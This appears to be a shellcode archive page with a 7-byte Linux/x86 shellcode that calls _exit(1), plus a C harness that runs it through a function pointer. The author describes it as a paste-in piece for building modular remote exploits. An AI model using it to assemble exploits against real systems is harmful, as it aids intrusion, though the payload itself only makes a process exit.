<html><head><title>Linux/x86 - exit(1) - 7 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* exit-core.c by Charles Stevenson &lt; core@bokeoa.com &gt;  
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I use it when I need a process to exit cleanly.
 */
char hellcode[] = /*  _exit(1); linux/x86 by core */
// 7 bytes _exit(1) ... 'cause we're nice &gt;:) by core
&quot;\x31\xc0&quot;              // xor  %eax,%eax
&quot;\x40&quot;                  // inc  %eax
&quot;\x89\xc3&quot;              // mov  %eax,%ebx
&quot;\xcd\x80&quot;              // int  $0x80
;

int main(void)
{
  void (*shell)() = (void *)&amp;hellcode;
  printf(&quot;%d byte _exit(1); linux/x86 by core\n&quot;,
         strlen(hellcode));
  shell();
  return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
